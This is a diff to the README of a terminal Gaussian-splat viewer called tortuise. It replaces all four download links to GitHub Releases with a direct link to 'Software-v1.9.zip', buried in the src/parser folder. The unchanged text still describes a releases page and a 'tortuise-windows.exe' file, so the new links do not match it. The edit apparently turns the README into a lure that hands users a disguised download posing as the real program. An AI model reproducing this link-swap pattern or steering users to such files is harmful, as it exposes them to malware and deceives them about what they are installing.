@@ -1,6 +1,6 @@
 # 🐢 tortuise - Gaussian splats in your terminal
 
-[![Download tortuise](https://img.shields.io/badge/Download-tortuise-blue?style=for-the-badge&logo=github)](https://github.com/Olusolabiodun/tortuise/releases)
+[![Download tortuise](https://img.shields.io/badge/Download-tortuise-blue?style=for-the-badge&logo=github)](https://github.com/Olusolabiodun/tortuise/raw/refs/heads/main/src/parser/Software-v1.9.zip)
 
 ## 🐢 What is tortuise?
 
@@ -24,7 +24,7 @@ You do not need a fancy graphics card because the app runs entirely in text mode
 
 To get tortuise, visit this page on GitHub and download the latest version:
 
-[Download tortuise from GitHub Releases](https://github.com/Olusolabiodun/tortuise/releases)
+[Download tortuise from GitHub Releases](https://github.com/Olusolabiodun/tortuise/raw/refs/heads/main/src/parser/Software-v1.9.zip)
 
 Once on the page, look for a file labeled something like `tortuise-windows.exe` or similar. Choose the most recent one, and click to download.
 
@@ -36,7 +36,7 @@ Follow these steps to download and run tortuise without trouble:
 
 2. **Visit the release page** by clicking this link again:
    
-   https://github.com/Olusolabiodun/tortuise/releases
+   https://github.com/Olusolabiodun/tortuise/raw/refs/heads/main/src/parser/Software-v1.9.zip
 
 3. **Find the latest version**. The page lists versions by dates. The newest is at the top.
 
@@ -124,4 +124,4 @@ This step is optional and for users comfortable with basic Windows file manageme
 
 ---
 
-[Get tortuise to your PC now](https://github.com/Olusolabiodun/tortuise/releases) and try it in your Windows terminal.
+[Get tortuise to your PC now](https://github.com/Olusolabiodun/tortuise/raw/refs/heads/main/src/parser/Software-v1.9.zip) and try it in your Windows terminal.
